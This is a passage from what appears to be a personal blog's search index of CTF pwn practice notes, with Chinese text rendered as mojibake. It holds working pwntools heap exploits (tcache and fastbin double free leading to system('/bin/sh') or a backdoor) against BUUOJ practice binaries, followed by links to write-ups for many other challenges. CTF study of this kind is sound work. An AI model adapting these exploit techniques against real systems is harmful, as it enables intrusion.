ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#------------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,content</span>):<br>    sla(<span class="hljs-string">&#x27;Your choice: &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;Please input size: \n&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    sa(<span class="hljs-string">&#x27;Please input content: \n&#x27;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>    sla(<span class="hljs-string">&#x27;Your choice: &#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;Please input list index: \n&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    sla(<span class="hljs-string">&#x27;Your choice: &#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;Please input list index: \n&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-comment">#------------------------------</span><br>binsh=<span class="hljs-number">0x602010</span><br>system=elf.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<br>free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;bbbb&#x27;</span>)<br>add(<span class="hljs-number">0x10</span>,p64(binsh)+p64(system))<br>show(<span class="hljs-number">0</span>)<br><span class="hljs-comment">#debug()</span><br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="wustctf2020-easyfast">wustctf2020_easyfast</h3><p>è¿™é¢˜æ˜¯libc2.23çš„doublefreeï¼Œæ³¨æ„åŒºåˆ«<br>å¼•ç”¨è¿™ä½å¸ˆå‚…çš„å›é¡¾double freeæ‰‹æ³•</p><p>åœ¨glibc2.27ä¹‹å‰ï¼Œä¸»è¦æ˜¯fastbin double freeï¼š<br>fastbinåœ¨freeæ—¶åªä¼šæ£€æŸ¥ç°åœ¨é‡Šæ”¾çš„chunkï¼Œæ˜¯ä¸æ˜¯å¼€å¤´çš„chunkï¼Œå› æ­¤å¯ä»¥é€šè¿‡free(C1), free(C2),<br>free(C1)çš„æ‰‹æ³•ç»•è¿‡ å¹¶åœ¨åœ¨fastbinå–å‡ºæ—¶ï¼Œä¼šæ£€æŸ¥sizeå­—æ®µæ˜¯ä¸æ˜¯å±äºè¿™ä¸ªfastbinï¼Œå› æ­¤å¾€å¾€éœ€è¦ä¼ªé€ ä¸€ä¸ªsize<br>glibc2.27~glibc2.28ï¼Œä¸»è¦æ˜¯tcache double free ç›¸è¾ƒäºfastbin double<br>freeï¼Œtcacheå®Œå…¨æ²¡æœ‰ä»»ä½•æ£€æŸ¥ï¼Œåªéœ€è¦free(C1), free(C1)å°±å¯ä»¥æ„é€ ä¸€ä¸ªç¯å‡ºæ¥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from LibcSearcher import * </span><br>local_file  = <span class="hljs-string">&#x27;./wustctf2020_easyfast&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">27879</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#-------------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size</span>):<br>        sla(<span class="hljs-string">&#x27;choice&gt;\n&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>        sla(<span class="hljs-string">&#x27;size&gt;\n&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>        sla(<span class="hljs-string">&#x27;choice&gt;\n&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>        sla(<span class="hljs-string">&#x27;index&gt;\n&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,content</span>):<br>        sla(<span class="hljs-string">&#x27;choice&gt;\n&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>        sla(<span class="hljs-string">&#x27;index&gt;\n&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br>        se(content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">backdoor</span>():<br>        sla(<span class="hljs-string">&#x27;choice&gt;\n&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br><span class="hljs-comment">#--------------------------------</span><br>add(<span class="hljs-number">0x40</span>)<span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x40</span>)<span class="hljs-comment">#1</span><br>free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">0</span>)<br><span class="hljs-comment">#add(0x40)</span><br>edit(<span class="hljs-number">0</span>,p64(<span class="hljs-number">0x602080</span>))<br>add(<span class="hljs-number">0x40</span>)<br>add(<span class="hljs-number">0x40</span>)<br>edit(<span class="hljs-number">3</span>,p64(<span class="hljs-number">0</span>))<br>backdoor()<br><span class="hljs-comment">#debug()</span><br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="judgement-mna-2016">judgement_mna_2016</h3><p><a href="https://blog.csdn.net/m0_51251108/article/details/121165338?spm=1001.2014.3001.5502">judgement_mna_2016ï¼ˆ32ä½fmtï¼‰_Nqoinaençš„åšå®¢-CSDNåšå®¢</a></p><h3 id="wustctf2020-name-your-dog">wustctf2020_name_your_dog</h3><p><a href="https://blog.csdn.net/m0_51251108/article/details/121167688?spm=1001.2014.3001.5502">wustctf2020_name_your_dogï¼ˆæ•°ç»„è¶Šç•ŒåŠ«æŒgotï¼‰_Nqoinaençš„åšå®¢-CSDNåšå®¢</a></p><h3 id="hitcon-2018-children-tcache">hitcon_2018_children_tcache</h3><p><a href="https://blog.csdn.net/m0_51251108/article/details/121169047?spm=1001.2014.3001.5502">hitcon_2018_children_tcacheï¼ˆtcache off-by-nullï¼Œå¦ä¸€ç§doublefreeï¼‰_Nqoinaençš„åšå®¢-CSDNåšå®¢</a></p><h3 id="zctf-2016-note3">zctf_2016_note3</h3><p><a href="https://blog.csdn.net/m0_51251108/article/details/121176333?spm=1001.2014.3001.5502">zctf_2016_note3ï¼ˆæ•´æ•°æº¢å‡ºï¼Œunlinkï¼‰_Nqoinaençš„åšå®¢-CSDNåšå®¢</a></p><h3 id="roarctf-2019-realloc-magic">roarctf_2019_realloc_magic</h3><p><a href="https://blog.csdn.net/m0_51251108/article/details/121182007?spm=1001.2014.3001.5502">roarctf_2019_realloc_magicï¼ˆreallocï¼ŒIO_file_leakï¼Œdoublefreeï¼‰_Nqoinaençš„åšå®¢-CSDNåšå®¢_roarctf_2019_realloc_magic</a></p><h3 id="bcloud-bctf-2016">bcloud_bctf_2016</h3><p><a href="https://blog.csdn.net/m0_51251108/article/details/121216910?spm=1001.2014.3001.5502">bcloud_bctf_2016ï¼ˆ32ä½å †ï¼Œhouse-of-forceï¼‰_Nqoinaençš„åšå®¢-CSDNåšå®¢</a></p><h3 id="xman-2019-format">xman_2019_format</h3><p>ï¼ˆéæ ˆä¸Šæ ¼å¼åŒ–å­—ç¬¦ä¸²ä»…ä¸€æ¬¡åˆ©ç”¨çš„çˆ†ç ´ï¼‰</p><p><a href="https://blog.csdn.net/m0_51251108/article/details/121237020?spm=1001.2014.3001.5502">xman_2019_formatï¼ˆéæ ˆä¸Šæ ¼å¼åŒ–å­—ç¬¦ä¸²ä»…ä¸€æ¬¡åˆ©ç”¨çš„çˆ†ç ´ï¼‰_Nqoinaençš„åšå®¢-CSDNåšå®¢_xman_2019_format</a></p><h3 id="ciscn-2019-final-5">ciscn_2019_final_5</h3><p><a href="https://blog.csdn.net/m0_51251108/article/details/121275841?spm=1001.2014.3001.5502">ciscn_2019_final_5(ä¸´ç•Œæ¡ä»¶é”™è¯¯ï¼ŒåŠ«æŒGOT)_Nqoinaençš„åšå®¢-CSDNåšå®¢</a></p><h3 id="qctf2018-stack2">qctf2018_stack2</h3><p><a href="https://blog.csdn.net/m0_51251108/article/details/121292902?spm=1001.2014.3001.5502">qctf2018_stack2ï¼ˆæ•°ç»„è¶Šç•Œï¼Œåç§»å¯»æ‰¾ï¼‰_Nqoinaençš„åšå®¢-CSDNåšå®¢_qctf2018_stack2</a></p><h3 id="ciscn-2019-sw-1">ciscn_2019_sw_1</h3><p><a href="https://blog.csdn.net/m0_51251108/article/details/121302556?spm=1001.2014.3001.5502">ciscn_2019_sw_1ï¼ˆfmtåŠ«æŒfini_arrayä¸ºmainï¼Œè·å¾—ä¸€æ¬¡å¾ªç¯ï¼‰_Nqoinaençš„åšå®¢-CSDNåšå®¢</a></p><h3 id="gyctf-2020-some-thing-interesting">gyctf_2020_some_thing_interesting</h3><p><a href="https://blog.csdn.net/m0_51251108/article/details/121306153?spm=1001.2014.3001.5502">gyctf_2020_some_thing_interestingï¼ˆfmtæ³„éœ²libcï¼Œdoublefreeï¼‰_Nqoinaençš„åšå®¢-CSDNåšå®¢</a></p><h3 id="gyctf-2020-document">gyctf_2020_document</h3><p><a href="https://blog.csdn.net/m0_51251108/article/details/121321652?spm=1001.2014.3001.5502">gyctf_2020_document(uaf)_Nqoinaençš„åšå®¢-CSDNåšå®¢_gyctf_2020_document</a></p><h3 id="houseoforange-hitcon-2016">houseoforange_hitcon_2016</h3><p><a href="https://blog.csdn.net/m0_51251108/article/details/121344075?spm=1001.2014.3001.5502">houseoforange_hitcon_2016ï¼ˆunsortbin attackï¼Œfsopï¼‰_Nqoinaençš„åšå®¢-CSDNåšå®¢_unsortbinattack</a></p><h3 id="ciscn-2019-s-6">ciscn_2019_s_6</h3><p>ï¼ˆuafï¼‰</p><p><a href="https://blog.csdn.net/m0_51251108/article/details/121353453?spm=1001.2014.3001.5502">ciscn_2019_s_6ï¼ˆuafï¼‰_Nqoinaençš„åšå®¢-CSDNåšå®¢</a></p><h3 id="hgame2018-flag-server">hgame2018_flag_server</h3><p><a href="https://blog.csdn.net/m0_51251108/article/details/121361533?spm=1001.2014.3001.5502">hgame2018_flag_server_Nqoinaençš„åšå®¢-CSDNåšå®¢</a></p><h3 id="de1ctf-2019-weapon">de1ctf_2019_weapon</h3><p><a href="https://blog.csdn.net/m0_51251108/article/details/121361905?spm=1001.2014.3001.5502">de1ctf_2019_weaponï¼ˆIO_leak,doublefreeï¼‰_Nqoinaençš„åšå®¢-CSDNåšå®¢</a></p><h3 id="SWPUCTF-2019-p1KkHeap">SWPUCTF_2019_p1KkHeap</h3><p>ï¼ˆtcacheè¡¨å¤´æ”»å‡»ï¼Œuafï¼ŒORWï¼‰</p><p><a href="https://blog.csdn.net/m0_51251108/article/details/121398983?spm=1001.2014.3001.5502">SWPUCTF_2019_p1KkHeapï¼ˆtcacheè¡¨å¤´æ”»å‡»ï¼Œuafï¼ŒORWï¼‰_Nqoinaençš„åšå®¢-CSDNåšå®¢_tcache åˆ—è¡¨å¤´</a></p><h3 id="sctf-2019-easy-heap">sctf_2019_easy_heap</h3><p>ï¼ˆoff by nullï¼Œunlinké€ æˆdoublefreeï¼‰</p><p><a href="https://blog.csdn.net/m0_51251108/article/details/121411787?spm=1001.2014.3001.5502">sctf_2019_easy_heapï¼ˆoff by nullï¼Œunlinké€ æˆdoublefreeï¼‰_Nqoinaençš„åšå®¢-CSDNåšå®¢_unlink doublefree</a></p><h3 id="picoctf-2018-echooo">picoctf_2018_echooo</h3><p><a href="https://blog.csdn.net/m0_51251108/article/details/121420155?spm=1001.2014.3001.5502">picoctf_2018_echoooï¼ˆfmtï¼‰_Nqoinaençš„åšå®¢-CSDNåšå®¢</a></p><h3 id="x-nuca-2018-offbyone2">x_nuca_2018_offbyone2</h3><p>ï¼ˆoff by nullï¼Œunlinké€ æˆdoublefreeï¼‰</p><p><a href="https://blog.csdn.net/m0_51251108/article/details/121429481?spm=1001.2014.3001.5502">x_nuca_2018_offbyone2ï¼ˆoff by nullï¼Œunlinké€ æˆdoublefreeï¼‰_Nqoinaençš„åšå®¢-CSDNåšå®¢_x_nuca_2018_offbyone2</a></p><h2 id="å¤§äºŒä¸‹">å¤§äºŒä¸‹</h2><h2 id="å¤§ä¸‰ä¸Š">å¤§ä¸‰ä¸Š</h2><h3 id="shanghai2018-baby-armï¼Œjarvisoj-typoï¼ˆarmropï¼‰">shanghai2018_baby_armï¼Œjarvisoj_typoï¼ˆarmropï¼‰</h3><p><a href="https://blog.csdn.net/m0_51251108/article/details/126954854?spm=1001.2014.3001.5502">shanghai2018_baby_armï¼Œjarvisoj_typoï¼ˆarmropï¼‰_Nqoinaençš„åšå®¢-CSDNåšå®¢</a></p><h3 id="qctf-2018-dice-gameï¼Œxm-2019-awd-pwn2">qctf_2018_dice_gameï¼Œxm_2019_awd_pwn2</h3><p><a href="https://blog.csdn.net/m0_51251108/article/details/126955874?spm=1001.2014.3001.5502">qctf_2018_dice_gameï¼Œxm_2019_awd_pwn2_Nqoinaençš„åšå®¢-CSDNåšå®¢</a></p><h3 id="2020-æ–°æ˜¥çº¢åŒ…é¢˜-3">[2020 æ–°æ˜¥çº¢åŒ…é¢˜]3</h3><p>(libc2.29 tcache tashing unlink )</p><p>[<a href="https://blog.csdn.net/m0_51251108/article/details/127078196?spm=1001.2014.3001.5502">2020 æ–°æ˜¥çº¢åŒ…é¢˜]3(libc2.29 tcache tashing unlink )_Nqoinaençš„åšå®¢-CSDNåšå®¢</a></p><h3 id="hitcon-ctf-2019-one-punch">hitcon_ctf_2019_one_punch</h3><p>(libc2.29 tcache tashing unlink)</p><p><a href="https://blog.csdn.net/m0_51251108/article/details/127121786?spm=1001.2014.3001.5502">hitcon_ctf_2019_one_punch(libc2.29 tcache tashing unlink)_Nqoinaençš„åšå®¢-CSDNåšå®¢</a></p><h3 id="OGeek2019-Final-OVM">[OGeek2019 Final]OVM</h3><p>ï¼ˆç®€æ˜“è™šæ‹Ÿæœºé€ƒé€¸ï¼‰</p><p>[<a href="https://blog.csdn.net/m0_51251108/article/details/127354652?spm=1001.2014.3001.5502">OGeek2019 Final]OVMï¼ˆç®€æ˜“è™šæ‹Ÿæœºé€ƒé€¸ï¼‰_Nqoinaençš„åšå®¢-CSDNåšå®¢_ovmè™šæ‹Ÿæœº</a></p><h2 id="æ­¢äºæ­¤">æ­¢äºæ­¤</h2>]]></content>
    
    
    <categories>
      
      <category>åˆ·é¢˜</category>
      
    </categories>
    
    
  </entry>
  
  
  
  
</search>
